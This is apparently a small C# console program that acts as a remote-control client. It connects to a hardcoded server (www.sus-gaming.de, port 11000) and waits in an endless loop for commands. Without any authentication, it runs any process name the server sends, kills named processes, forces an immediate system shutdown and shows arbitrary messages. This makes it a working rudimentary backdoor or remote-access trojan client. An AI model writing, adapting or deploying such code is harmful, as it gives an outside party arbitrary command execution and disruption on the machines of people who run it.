using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.ComponentModel;
using System.Windows.Forms;
using System.Diagnostics;



namespace EmpfängerKS
{
    class Program
    {
        static void Main(string[] args)
        {
            var Fkts = new Fkts();
            Fkts.Launch();
            Console.ReadLine();
        }
    }

    class Fkts
    {
        Socket sock;
        public BackgroundWorker ReceiverThread = new BackgroundWorker();
        public void Launch()
        {
            InitThreads();
            connect();
        }
        public void InitThreads()
        {
            this.ReceiverThread.DoWork +=
                new DoWorkEventHandler(ReceiverThread_DoWork);
        }
        public void connect()
        {
            IPHostEntry host = Dns.GetHostEntry("www.sus-gaming.de");
            IPAddress ipAddress = host.AddressList[0];
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);
            sock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            sock.Connect(remoteEP);
            ReceiverThread.RunWorkerAsync();
        }
        private void ReceiverThread_DoWork(object sender, DoWorkEventArgs e)
        {
            do
            {
                string data = ReceiveData();
                chkcmd(data);
            } while (true);
        }
        private string ReceiveData()
        {
            string data = null;
            byte[] bs = null;
            bs = new byte[1024];
            int bsint = sock.Receive(bs);
            data += Encoding.ASCII.GetString(bs, 0, bsint);
            return data;
        }
        private void chkcmd(string data)
        {
            try
            {
                if (data.Substring(0, 6) == "///CMD")
                {
                    runcmd(data);
                }
                else
                {
                    MessageBox.Show(data);
                }
            }
            catch
            {
                MessageBox.Show(data);
            }
        }

        private void runcmd(string data)
        {
            switch (data)
            {
                case "///CMD_RUN_PROCESS":
                    {
                        StartProcess();
                        break;
                    }
                case "///CMD_KILL_PROCESS":
                    {
                        KillProcess();
                        break;
                    }
                case "///CMD_SHUTDOWN":
                    {
                        Process.Start("shutdown", "/s /f /t 0");
                        break;
                    }
            }

        }
        private void StartProcess()
        {
            string processname = ReceiveData();

            Process.Start(processname);
        }
        private void KillProcess()
        {
            string processname = ReceiveData();

            Process[] Processes = Process.GetProcessesByName(processname);

            foreach (Process process in Processes)
                process.Kill();
        }
    }
}
